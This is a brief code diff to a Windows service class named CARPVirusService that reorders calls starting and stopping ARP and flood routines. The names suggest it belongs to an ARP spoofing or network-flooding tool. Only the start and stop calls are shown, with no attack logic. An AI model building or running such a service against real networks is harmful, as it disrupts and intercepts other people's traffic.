@@ -23,9 +23,8 @@ CARPVirusService::~CARPVirusService(void)
 DWORD CARPVirusService::serviceMain(int argc, TCHAR * argv[])
 {
 	setStatus(SERVICE_RUNNING);
+	lib_arp_start();
 	lib_flood_start();
-	lib_arp_start();	
-
 	ACE_Thread_Manager::instance()->wait();
 	return 0;
 }
@@ -33,5 +32,6 @@ DWORD CARPVirusService::serviceMain(int argc, TCHAR * argv[])
 void CARPVirusService::stop()
 {
 	lib_flood_stop();
+	
 	lib_arp_stop();
 }
